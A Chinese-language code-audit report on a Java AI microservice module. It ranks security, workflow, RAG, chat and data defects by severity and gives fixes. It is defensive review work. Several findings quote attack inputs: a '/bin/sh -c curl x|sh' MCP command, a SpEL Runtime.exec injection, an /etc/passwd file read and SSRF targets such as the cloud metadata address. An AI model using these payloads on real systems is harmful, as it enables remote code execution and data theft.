# micro-service-platform-ai 代码质量 / 设计 / 功能缺陷 完整整改报告

> 审查对象：`micro-service-platform/micro-service-plugin/micro-service-platform-ai`
> 审查方式：安全鉴权、工作流引擎、RAG/知识库/向量化/图谱、对话/模型/MCP、数据层/工程化 五个维度全量只读通读 + 框架层（Sa-Token、MyBatis-Plus 租户/乐观锁插件、脱敏序列化、Redis 缓存、langchain4j 1.9.1 源码）交叉验证。
> 主代码约 326 个 Java 文件（约 3.9 万行），测试 22 个文件。

## 结论摘要

功能覆盖面很广（智能体、知识库、RAG、GraphRAG、向量化、工作流引擎、MCP、技能、统计），核心状态机与 SSE 占用协议等局部设计有亮点，但**成熟度显著落后于功能扩张速度**：存在多处会直接产出错误结果或造成数据泄露/资损的致命缺陷，且 `skipTests=true` 使 162 个测试在 CI 中从不执行，导致"编译能过、运行必炸"的问题长期存活。

统计（去重后）：**P0 致命 13 项、P1 严重 26 项、P2 一般 30+ 项、P3 建议若干**。

| 维度 | P0 | P1 | 代表问题 |
|---|---|---|---|
| 安全鉴权 | 3 | 7 | MCP STDIO RCE、开放 API 跨租户 IDOR、SSRF、权限注解缺失 |
| 工作流引擎 | 5 | 12 | IF_ELSE 运算符残缺、迭代节点空转、SpEL 无沙箱 RCE、执行体包在事务里 |
| RAG/向量化 | 5 | 13 | 乐观锁静默失败、向量任务死锁、FAQ 不建 chunk、图谱跨库串联、图谱无 embedding |
| 对话/模型 | 2 | 7 | 普通对话越权、断连丢回复、MCP 绑定类型不匹配、清空会话是假的 |
| 数据/工程化 | 4 | 7 | 租户白名单表名错误、JSON 字段丢失、坏 SQL、skipTests |

---

## 一、整体架构评价

- **分层纪律失守**：`core` 内 13 个文件反向 import `service`；`domain/entity/VectorizationTask` 竟 import `service.VectorService` 内部枚举（领域层依赖服务层，依赖倒置）。`core=可复用能力层`的定位不成立。
- **配置类分裂/死配置**：`RagProperties`、`MilvusProperties`、`Neo4jProperties` 三个 `@ConfigurationProperties` 类基本无人读取；`core/workflow/performance/`（`WorkflowCache`/`WorkflowMetrics`/`WorkflowPerformanceConfig`）整包未接线。
- **大量"看似实现、从未接线"的半成品**：检索策略注册中心、Token 事件链路、`CustomizeChatModelListener`、迭代子图执行、并行 WaitStrategy 等。
- **枚举/状态魔法值并存**：任务态用裸 String + 手写 switch，与条目态、用户文档口径三套不一致。

---

## 二、P0 致命缺陷

### 安全

**P0-SEC-1　MCP STDIO 配置导致任意命令执行（RCE）**
`controller/McpServerController.java`（无权限注解）+ `service/impl/McpConnectionManagerImpl.java:96-114`。任意登录用户可创建 `type=STDIO` 的 MCP 配置，`command`/`args` 完全由用户控制，调用 `/{id}/test-connection` 即在服务器 `spawn` 进程。可 `command=/bin/sh, args=["-c","curl x|sh"]` 获得 RCE。
修复：STDIO 仅限管理员 + 命令白名单；生产禁用 STDIO。

**P0-SEC-2　普通文本对话不校验 conversationId 归属（横向越权）**
`service/impl/ChatServiceImpl.java`（`handleTextChat`）。不校验会话归属即加载他人历史/摘要注入模型并经 SSE 回流，且可向他人会话写消息、抢占 Redis 占用锁 5 分钟。知识库/智能体路径有 `userId` 校验，普通对话裸奔。
修复：进入即校验 `conversation.userId/tenantId`。

**P0-SEC-3　管理接口全面缺失功能权限注解**
全模块仅 `AiStatisticsController` 有 `@SaCheckPermission`；其余 23 个控制器仅需登录即可访问，`WorkflowApiKeyController`/`ModelController`/`McpServerController` 尤为危险，与 IDOR 叠加成完整攻击链。

### 工作流

**P0-FLOW-1　IF_ELSE 条件运算符残缺 + 无 else 时激活所有分支**
`core/workflow/runtime/WorkflowRuntimeExecutor.java:490-500`：`matchesConditions` 只实现 `EQUALS`/`NOT_EQUALS`，其余走 `default->false`；`GREATER_THAN`/`CONTAINS`/`IS_NULL` 等全部静默失效。无匹配且无 ELSE 时 `selectIfElseBranch` 返回 null → `nextEdges` 返回**全部出边**，then/else 同时执行。业务结果错误。
修复：委托 `CompareUtils.compare`，读取分支 AND/OR，无命中走明确默认端口。

**P0-FLOW-2　ITERATION 节点在生产环境不执行循环体**
`core/workflow/agent/impl/IterationNodeExecutor.java:335-347`：`iterationProcessor` 仅测试 `@Setter` 注入，生产为 null，直接原样回填元素。迭代内部子图从未执行，测试靠手动注入掩盖。
修复：接入真实子图执行回调。

**P0-FLOW-3　ExpressionEvaluator 用无沙箱 SpEL 导致 RCE**
`core/workflow/expression/ExpressionEvaluator.java:248-258`：`StandardEvaluationContext` 全功能上下文，`LoopNodeExecutor.exitCondition` 来自用户配置直入 SpEL，可 `T(java.lang.Runtime).getRuntime().exec(...)`。
修复：改 `SimpleEvaluationContext.forReadOnlyDataBinding()`。

**P0-FLOW-4　HTTP 节点 SSRF 防护可绕过**
`core/workflow/agent/impl/HttpNodeExecutor.java:323-364`：黑名单字符串前缀匹配，漏 `169.254.169.254`（云元数据）、`0.0.0.0`、十进制/十六进制 IP、IPv6 ULA/link-local；校验 host 字符串而非解析 IP；`RestTemplate` 默认跟随 302 重定向、无超时；DNS rebinding 不防。
修复：解析 IP 后用 `InetAddress` 判定 loopback/linkLocal/siteLocal/anyLocal；禁重定向；设超时。

**P0-FLOW-5　同步执行把 LLM/HTTP 长任务包在单个 DB 事务内**
`service/impl/WorkflowExecutionServiceImpl.java:104-141`：`@Transactional` 覆盖整个执行（数十秒~分钟），DB 连接与行锁长期占用，高并发耗尽连接池。
修复：执行体移出事务，仅"建记录/写结果"两个短事务。

### RAG / 数据

**P0-RAG-1　知识条目乐观锁误用：所有更新接口静默失败（0 行更新）**
框架无条件注册 `OptimisticLockerInnerInterceptor`，`KnowledgeItem.version` 标 `@Version`，业务却手工 `setVersion(item.getVersion()+1)`（`KnowledgeItemServiceImpl.java:146-149`、`318-327`）。插件生成 `WHERE version=N+1` 而库中是 N → 匹配 0 行，更新丢失且未检查返回值。`updateDocument` 更危险：主体更新失败但分片重建/向量清理照常，三者不一致。
修复：不手工设 version（改字段后 `updateById` 让插件自增），检查返回值。

**P0-RAG-2　向量化任务状态机死锁**
`service/impl/VectorServiceImpl.java:55-62`：查重条件 `!= FAILED`，即 COMPLETED 也拦截，而全模块无任何代码重置/删除任务 → 条目成功向量化一次后永远"不可再次创建任务"，文档更新后无法重嵌入。PROCESSING 无超时回收。
修复：仅拦 PENDING/PROCESSING；PROCESSING 超时回收；重向量化走"删旧+建新"。

**P0-RAG-3　FAQ/结构化数据向量化链路断裂**
`KnowledgeItemServiceImpl.createFAQ/createStructuredData` 只插条目不建 `KnowledgeChunk`，而向量化入口对空分片抛错 → FAQ/结构化数据向量化 100% 失败，检索不可召回。`ChunkType.QUESTION/ANSWER/FULL_QA` 枚举无生产者。
修复：创建时生成对应 chunk。

**P0-RAG-4　Neo4j 关系写入不带知识库标签：跨库/跨租户串联**
`core/provider/graph/neo4j/Neo4jGraphWriter.java:196-204`：`MATCH (source {id:$sourceId})` 无 `KB_<kbId>` 标签约束，匹配全库同名节点。多租户数据隔离被破坏。
修复：所有 MATCH 加标签，建复合唯一约束。

**P0-RAG-5　图谱节点从不生成 embedding：GraphRAG 语义路整条失效**
`GraphRagService.processDocuments` 恒以 `withEmbedding=false` 调用，节点无 embedding 属性；检索侧向量查询永远空。混合检索静默降级为只剩实体精确匹配一条腿，无告警。
修复：图谱化入口改 `withEmbedding=true`。

### 数据 / 工程化

**P0-DATA-1　多租户隔离实际失效（含模型 apiKey 跨租户可读）**
nacos `micro-service-platform-ai.properties` 的 `include-tables=ai_kb_knowledge_base,ai_model_config,ai_chat_agent,ai_mcp_server_config` 写的是**旧表名**，实际表名是 `ai_knowledge_base`/`ai_model`/`ai_agent`/`ai_mcp_server`。租户行级拦截器对本模块所有表一条都不生效，service 层又不手动过滤 → 租户 A 可分页看到租户 B 的模型配置（含 apiKey）、智能体、知识库。
修复：修正 include-tables 为真实表名并补齐全部业务表；发布前用集成测试校验表名。

**P0-DATA-2　JSON 字段 typeHandler 缺 autoResultMap，查询静默为 null**
`ModelEntity`/`McpServer`/`KnowledgeBase`/`KnowledgeChunk`/`KnowledgeItem`/`VectorMetadata`/`VectorizationTask` 用 `@TableField(typeHandler=JacksonTypeHandler)` 但 `@TableName` 无 `autoResultMap=true`。写入生效、查询不反序列化 → 模型维度/温度、MCP env、分片 metadata 查询后全丢，系统悄悄用默认值。
修复：7 个实体补 `autoResultMap = true`。

**P0-DATA-3　`updateStatusById` 引用不存在的列，异常被吞**
`repository/ConversationMessageMapper.java:26-28`：`UPDATE ai_conversation_turn SET status=?, updated_at=NOW()`，而该表无 `status`/`updated_at` 列（审计列是 `last_modify_time`）。调用方 catch 吞异常。
修复：删除该无效方法与调用链，或修正列名并补实体字段。

**P0-DATA-4　原生 SELECT * 注解 SQL 绕过 resultMap：工作流版本快照读出 null**
`repository/workflow/WorkflowVersionMapper`/`WorkflowTemplateMapper` 的 `@Select("SELECT * ...")` 不应用 autoResultMap，`graph_snapshot`(json)→`WorkflowGraph` 为 null，回滚/发布链路损坏（DDL NOT NULL 会报错）。
修复：改用 `SuperMapper`+`Wraps`，逻辑删除交给 `@TableLogic`。

---

## 三、P1 严重缺陷

### 安全
- **P1-SEC-1 开放 API 跨租户 IDOR**：`OpenWorkflowController` 仅校验 API Key 有效，不校验 executionId 归属；`@SaIgnore` 匿名态又关闭租户过滤 → 持任意有效 Key 可读取/取消/订阅全平台所有租户的执行。
- **P1-SEC-2 工作流执行接口全线越权**：`WorkflowExecutionController` 的 execute/subscribe/pause/cancel/updateVariable/snapshot 全无 owner/tenant 校验。
- **P1-SEC-3 工作流定义读/复制/版本越权**：`checkOwnership` 只在写操作调用，`detail/copy/getVersionHistory/getVersion` 未校验，泄露他人 graph 内嵌凭证。
- **P1-SEC-4 WorkflowApiKey 明文存储 + query 传参 + 限流未生效**。
- **P1-SEC-5 HTTP 节点 SSRF**（同 P0-FLOW-4，安全视角 P1）。
- **P1-SEC-6 DocExtractor 任意文件读取（LFI）**：`DocExtractorNodeExecutor.java:200-205` 变量被判为路径即 `Files.readAllBytes`，可传 `/etc/passwd`。
- **P1-SEC-7 MCP env/凭证明文回显**：`McpServerConfigPageResp` 直接返回 `env`（含密钥）。

### 工作流
- **P1-FLOW-1 CompiledWorkflow 每次重新编译**，`WorkflowCache` 是死代码。
- **P1-FLOW-2 LLM/参数提取器静态 `MEMORY_STORE` 内存泄漏**：`clearMemory` 从未被调用，按 executionId 只增不减 → OOM。
- **P1-FLOW-3 异步执行事务与线程边界竞态**：`@Transactional`+`@Async` 自调用，记录未提交即被异步线程/subscribe 读取。
- **P1-FLOW-4 执行状态机可能永久卡 RUNNING**：无 watchdog/超时回收；`waitIfPaused` 死循环占线程。
- **P1-FLOW-5 循环退出条件异常被吞**，仅靠 maxIterations 兜底，空转烧钱。
- **P1-FLOW-6 并行迭代超时不取消其余任务** + ForkJoinPool 跑阻塞任务。
- **P1-FLOW-7 缺整体执行超时**：单个慢节点挂起整条执行。
- **P1-FLOW-8 SSE 连接多路径泄漏**：同步执行 emitter 永不 complete、事件丢失、轮询占线程。
- **P1-FLOW-9 RestTemplate 无连接/读取超时**（且被注入了 `@LoadBalanced` 的 lbRestTemplate，外部 URL 会被当服务名解析）。
- **P1-FLOW-10 PARALLEL 是单线程伪并行**，WaitStrategy/timeout 从未实现。
- **P1-FLOW-11/12 Scope/变量池并发不安全**：为并行化埋雷，`modelEntity.getVariables().put(...)` 就地改共享对象。

### RAG / 向量化
- **P1-RAG-1 `@Transactional` 内 `future.get()` 无超时**：连接池耗尽 + 任务永久挂起。
- **P1-RAG-2 向量库写入与 DB 事务不一致**：孤儿向量无补偿；chunk/vectorId 数量不一致被静默截断。
- **P1-RAG-3 自调用绕过事务**：`vectorizeDocument` 内 `this.vectorizeKnowledgeItem` 逐条自动提交。
- **P1-RAG-4 图谱删除失效**：docId 用整条目 content hash，与写入时 chunk hash 对不上；`GraphExtractionServiceImpl.deleteGraphData` 是 `TODO` 假成功。
- **P1-RAG-5 并发重复向量化无互斥**：check-then-act 非原子，一个 chunk 两条元数据 → `findByChunkId` 抛 `TooManyResultsException`。
- **P1-RAG-6 图谱接口跨租户访问/删除**：kbId 直通 Neo4j 无归属校验，任意用户可删他租户整个图谱。
- **P1-RAG-7 MilvusServiceClient 连接泄漏**：竞态双建 + `clearCache` 不 `close`，每次模型变更泄漏一批 gRPC 通道。
- **P1-RAG-8 换 Embedding 模型无维度防护**：`KnowledgeBase.embedModelId` 可被 `modify` 全量覆盖，新维度写旧 collection 报错。
- **P1-RAG-9 Rerank 缓存键不含 apiKey**：密钥轮换后旧实例继续生效。
- **P1-RAG-10 Tika 大文件 OOM + 文件流泄漏 + 上传无限制**：`FileInputStream` 不关闭，全文一次性入内存，无大小/类型校验。
- **P1-RAG-11 Office MIME 判断缺陷**：xlsx/pptx 标准 MIME 未命中，落文本解析器产出乱码入库。
- **P1-RAG-12 批量向量化逐条串行 embed + `tokenUsage` 强制非空 NPE**：不用 `embedAll`，无重试。
- **P1-RAG-13 FAQ/条目创建把 Map 塞进 String content**：`question/answer` 强类型列全 NULL，数据写坏。

### 对话 / 模型
- **P1-CHAT-1 客户端断开后模型继续生成且完整回复不落库、token 统计丢失**。
- **P1-CHAT-2 RAG/Agent 对话在返回 SSE 前同步阻塞 Tomcat 线程**执行整条检索流水线（含 2 次 LLM 往返）。
- **P1-CHAT-3 `ChatAgentSaveReq.mcpServerIds` 类型与实体不匹配**（String vs List<Long>）→ MCP 绑定静默丢失。
- **P1-CHAT-4 `saveUserMessage` 吞异常返回 null → NPE**；NORMAL_TEXT 缺会话必坏。
- **P1-CHAT-5 模型删除无引用校验、无默认模型兜底**；`TextModelCache` 与 Redis 缓存体系不兼容（ChatModel 不可序列化）。
- **P1-CHAT-6 "清空会话消息"并不删除消息；删除会话留孤儿数据**。
- **P1-CHAT-7 MCP 客户端缓存竞态泄漏 + 无健康检查**：故障后智能体"静默无工具"。

---

## 四、P2 / P3（择要）

- **P2**：删除链路全量加载 + 逐条 remove + 事务内远程调用 + collection 永不清理；检索策略模式死代码与 AssistantService 双实现漂移；配置类三胞胎无人使用；混合检索融合仅简单平均分（无 RRF）；关键词搜索 `LIKE '%q%'` 全表扫 + 中文分词失效；`TextModelCache` Redis 不可用；`@Builder.Default` 被 null 击穿；会话元数据 messageCount/lastMessage 从不更新；SSE 错误事件三种格式；序号生成非原子；GraalVM 无资源限制 DoS；CompareUtils 用 double 相等有精度问题；反射读私有字段；实体 `@Data` 参与 equals/hashCode 风险；`skipTests=true`（P1 级工程问题）；langchain4j 混版（BOM 1.9.1 + agentic 1.10.0-beta18）。
- **P3**：Nacos 明文凭证；DTO 校验覆盖率约 55%；异常信息外泄前端；死代码一箩筐（`TokenUsageEvent`/`CustomizeChatModelListener`/`DynamicMcpToolProvider`/`WorkflowMetrics`/`mapdb` 依赖等）；magic number 散落；时区硬编码；进度魔法值 0/10/100；`inference_latency_ms` 永远 null。

---

## 五、测试覆盖现状

- 主代码 326 文件 vs 测试 22 文件（约 6.7%），162 个 `@Test/@Property`，0 个 `@SpringBootTest`，Testcontainers 声明但未实际使用。
- **致命伤：`pom.xml` `skipTests=true` → CI 一个都不跑**。P0-DATA-2/3/4 这类"运行必炸"的问题正是缺测试执行而存活。
- 零覆盖的核心链路：全部 19 个 Mapper、对话主链路、向量化链路、RAG 检索、图谱、MCP、SSE、统计 SQL、全部 24 个 controller。
- 现有工作流测试恰好漏掉致命 bug：IF_ELSE 只测 EQUALS、迭代靠手动注入 processor。

---

## 六、建议修复顺序

1. **立即（P0 安全 + 数据正确性）**：租户 include-tables 表名修正、7 实体补 autoResultMap、SpEL 只读上下文、SSRF 按 IP 拦截、普通对话归属校验、乐观锁静默失败、坏 SQL 清理。
2. **本迭代（P0 功能闭环）**：IF_ELSE 运算符与全分支、迭代节点子图执行、向量任务死锁、FAQ chunk、图谱 embedding/删除、执行体移出事务。
3. **紧接（P1）**：内存泄漏清理、异步事务竞态、执行超时与状态回收、RestTemplate 超时与非负载均衡、Milvus 连接泄漏、清空/删除会话级联、断连落库解耦、MCP 生命周期、权限注解补齐、API Key 哈希与限流。
4. **常规（P2/P3）**：架构收敛（策略注册去重、配置类合并、死代码清理）、缓存改 Caffeine、检索融合 RRF、补测试并移除 `skipTests`。

---

## 七、本轮已实施的修复

见同目录 `FIX_CHANGELOG.md`（随代码改动更新）。本轮优先修复了确定性高、风险低、影响大的 P0/P1 项，架构级改造（迭代子图执行、并行真并发、缓存体系重构等）需单独立项。
